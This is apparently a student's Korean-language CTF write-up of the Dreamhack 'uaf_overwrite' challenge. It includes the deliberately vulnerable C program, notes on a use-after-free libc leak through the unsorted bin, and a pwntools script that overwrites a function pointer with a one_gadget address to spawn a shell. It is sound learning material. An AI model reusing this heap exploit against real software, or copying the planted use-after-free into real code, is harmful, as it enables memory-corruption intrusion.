---
layout: post
title: "uaf_overwrite"
categories: [SWING, Writeup]
tags: [uaf, exploit, CTF]
last_modified_at: 2024-02-29
---

![Image](https://blog.kakaocdn.net/dna/H0pZ1/btsFmmPR15b/AAAAAAAAAAAAAAAAAAAAAPt5rrKwR8_Pjfu_8OHbe_VtLA_r5buJHWFJn6GzbJNG/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=fSnjivRcFSZVTZIB6b5dC15BikU%3D)

```cpp
// Name: uaf_overwrite.c
// Compile: gcc -o uaf_overwrite uaf_overwrite.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct Human {
  char name[16];
  int weight;
  long age;
};

struct Robot {
  char name[16];
  int weight;
  void (*fptr)();
};

struct Human *human;
struct Robot *robot;
char *custom[10];
int c_idx;

void print_name() { printf("Name: %s\n", robot->name); }

void menu() {
  printf("1. Human\n");
  printf("2. Robot\n");
  printf("3. Custom\n");
  printf("> ");
}

void human_func() {
  int sel;
  human = (struct Human *)malloc(sizeof(struct Human));

  strcpy(human->name, "Human");
  printf("Human Weight: ");
  scanf("%d", &human->weight);

  printf("Human Age: ");
  scanf("%ld", &human->age);

  free(human);
}

void robot_func() {
  int sel;
  robot = (struct Robot *)malloc(sizeof(struct Robot));

  strcpy(robot->name, "Robot");
  printf("Robot Weight: ");
  scanf("%d", &robot->weight);

  if (robot->fptr)
    robot->fptr();
  else
    robot->fptr = print_name;

  robot->fptr(robot);

  free(robot);
}

int custom_func() {
  unsigned int size;
  unsigned int idx;
  if (c_idx > 9) {
    printf("Custom FULL!!\n");
    return 0;
  }

  printf("Size: ");
  scanf("%d", &size);

  if (size >= 0x100) {
    custom[c_idx] = malloc(size);
    printf("Data: ");
    read(0, custom[c_idx], size - 1);

    printf("Data: %s\n", custom[c_idx]);

    printf("Free idx: ");
    scanf("%d", &idx);

    if (idx < 10 && custom[idx]) {
      free(custom[idx]);
      custom[idx] = NULL;
    }
  }

  c_idx++;
}

int main() {
  int idx;
  char *ptr;
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    menu();
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        human_func();
        break;
      case 2:
        robot_func();
        break;
      case 3:
        custom_func();
        break;
    }
  }
}
```

**1. human_func()**  
Human 구조체 동적 할당  
name, weight, age 입력  
할당한 메모리 해제 -> uaf 발생  

**2. robot_func()**  
Robot 구조체 동적 할당  
Human 구조체와 다른 건 long 자료형 선언이 없고 void 존재  
이를 long처럼 4바이트로 맞춰줘야 비슷한 크기로 인식해 같은 메모리 할당해줌  
fptr를 4바이트로 맞추기 //가능한가? 주소값을 작성하려면 64비트라서 8바이트인데..  

**3. custom_func()**  
9칸에 원하는 size만큼 할당하고 data 작성 가능함  

도커 파일 깔고 pwndbg, pwntools, onegadget 깔았음  
앞에 두 개는 포스트한 적 있고 onegadget은 다음 명령어 입력  
```bash
apt install ruby
gem install one_gadget
```

----아래는 라업.. 내가 캐치 못한 내용만 적음  
이미 Human과 Robot 구조체는 크기가 같다네요..  
그럼 fptr이 자유로워짐 이 변수에 쉘이든 뭐든.. flag 얻는 창구가 됨  
custom_func은 0x100이상 크기 갖는 청크 할당, 해제 가능  
이부분도 uaf 발생  

### 익스플로잇 설계  
Robot.fptr 값을 원가젯 주소로 덮음  

**1. 라이브러리 릭**  
uaf 이용해서 libc 매핑 주소 구하기  
ptmalloc2의 unsorted bin 특징 이용..  

unsorted bin에 처음 연결되는 청크.. libc 영역의 특정 주소와 이중 원형 연결 리스트 형성..  
-> fd와 bk 값으로 libc 영역의 특정 주소 가짐  
unsorted bin에 연결된 청크 재할당 -> uaf로 fd나 bk 값 읽기 -> libc 영역 특정 주소 get.. 오프셋 빼면 libc 베이스 주소 get..  

custom_func 함수:  
0x410 이하 크기 청크는 tcache에 먼저 삽입, 이보다 큰 청크를 해제해서 unsorted bin에 연결->재할당->uaf 값 읽기  
주의: 해제할 청크와 탑 청크 맞닿으면 안됨.. 병합 때문!  

1. 탑 청크와 맞닿지 않도록 0x510 크기 청크 두 개 생성  
2. 처음 생성한 청크 해제  
3. fd와 bk 값 관찰  
위 실습 진행을 하려면 사전에 설명했던 Dockerfile 빌드해야 하는데 안되길래  
워게임에 있는 Dockerfile로 구축하고 pwntools, pwndbg, one_gadget 설치해줌  

![Image](https://blog.kakaocdn.net/dna/d7Fq9r/btsFhS3yNGR/AAAAAAAAAAAAAAAAAAAAAPrX3Y9BAG9dM2-xnFTYgB0uyT6_1NzIM24Ic4-8DXSt/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=6OTS31DlAlF%2BHquzxRwYD4dEpsw%3D)

1. 0x500만큼 할당 후 a 입력  
Free idx는 -1 입력 -> 아무것도 free되지 않음  
2. 0x500만큼 할당 후 b 입력  
Free idx는 0 입력 -> 1에서 할당한 청크 free  

이후에 heap 명령어 쳐서 청크 정보 봐야 하는데  
실습 환경 진짜 오류 오지게 남  
문서화로만 드감........................  

![Image](https://blog.kakaocdn.net/dna/bU3x48/btsFoD46L0W/AAAAAAAAAAAAAAAAAAAAAANmkSfHMs4-nPNQ5DWroNTGfXYvqNPttIGtKTJOyRhs/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=t0DmpZLyTWBttiBa01g1QcuJyJQ%3D)

위 그림 살펴보기  
3250이 첫번째 청크  
allocated chunk에 있는 3760이 두번째 청크  
첫번째 청크의 fd와 bk.. 0x7ffff7dcdca0  
vmmap 명령어로 살펴보자  

![Image](https://blog.kakaocdn.net/dna/dfCiJV/btsFkWksXhX/AAAAAAAAAAAAAAAAAAAAAPpDEKGUK0xx6jI-SHX7ZQMvXpUmFJnWet3bgLWEJLuL/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=fCKaSp6BzqpPtO2TJXKjETAL%2FRU%3D)

짤렸지만 뒤에 File이 /home/dreamhack/libc-2.27.so +0xca0임  
-> libc 영역에 존재하는 주소  
여기서 libc가 매핑된 주소 빼면 오프셋을 구할 수 있다.  

![Image](https://blog.kakaocdn.net/dna/s96H7/btsFoLB1Kix/AAAAAAAAAAAAAAAAAAAAAMBn2D1YG-UXIIGKFIRN26oIfaarxo4A7YjjMaPuOfer/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=xPhnQfoHkQjrZXnohQ7RPgcAmwU%3D)

여기도 짤렸지만 /home/dreamhack/libc-2.27.so 파일 매핑 주소는 0x7ffff79e2000  

0x7ffff7dcdca0 - 0x7ffff79e2000 = 오프셋  

**2. 함수 포인터 덮어쓰기**  
Human의 age와 Robot의 fptr 위치 동일  
age에 원가젯 주소 입력  

### 익스플로잇 코드  
**1. 라이브러리 릭**  
```python
from pwn import *

p = process('./uaf_overwrite')

def slog(sym, val): success(sym + ': ' + hex(val))

def human(weight, age):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(weight).encode())
    p.sendlineafter(b': ', str(age).encode())

def robot(weight):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(weight).encode())

def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)
    p.sendlineafter(b': ', str(idx).encode())

# UAF to calculate the `libc_base`
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', 0)
custom(0x500, b'B', -1) # data 값이 'B'가 아니라 'C'가 된다면, offset은 0x3ebc42 가 아니라 0x3ebc43이 됩니다.

lb = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
og = lb + 0x10a41c # 제약 조건을 만족하는 원가젯 주소 계산

slog('libc_base', lb)
slog('one_gadget', og)
```

![Image](https://blog.kakaocdn.net/dna/FdQ9l/btsFnVkGEl2/AAAAAAAAAAAAAAAAAAAAAOnYx4MGx8tBaowi0e_y337P0wI1jZbJM2Vbd5Akf-pJ/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=3EI%2BnoXEDG4uLzxrONrhotjyPvI%3D)

도커에 루드 권한으로 접속해야 vi 파일이 저장된다.. (왜인지는 모르겠음)  

**2. 함수 포인터 덮어쓰기**  
```python
# UAF to manipulate `robot->fptr` & get shell
human(1, og)
robot(1)

p.interactive()
```  

![Image](https://blog.kakaocdn.net/dna/ciKWuG/btsFlSvrHhf/AAAAAAAAAAAAAAAAAAAAAOkpSyOWUmRRpHsKhHYTwIBQ9CV6r8YRZCGS-7clnyzC/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=G9gmQwVpIipb5MPIPy0HDGYrVDo%3D)